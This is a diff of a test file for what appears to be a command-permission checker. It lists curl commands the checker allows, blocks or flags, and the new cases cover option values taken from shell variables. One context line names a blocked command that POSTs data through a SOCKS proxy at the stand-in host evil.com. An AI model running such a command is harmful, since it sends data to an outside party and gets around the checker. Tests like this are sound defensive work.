@@ -1038,4 +1038,10 @@ blocks 'curl -d x -x socks5://evil.com http://localhost/'         "a public prox
 allows 'curl -d x -x localhost:3128 http://localhost/'            "a local proxy"
 allows 'curl -x proxy:3128 http://localhost/'                     "a proxy on a read"
 
+# Every curl long option that takes a value takes it, so a value from a variable is not read as a URL from one.
+allows 'curl -d x --max-filesize "$N" http://localhost/'          "a size from a variable"
+allows 'curl -d x --retry-delay "$D" --limit-rate $R http://localhost/' "two values from variables"
+asks   'curl -d x --url "$U"'                                     "--url's value is the URL"
+asks   'curl -d x --compressed "$U"'                              "an option that takes no value leaves the URL"
+
 finish "publish-cmd"
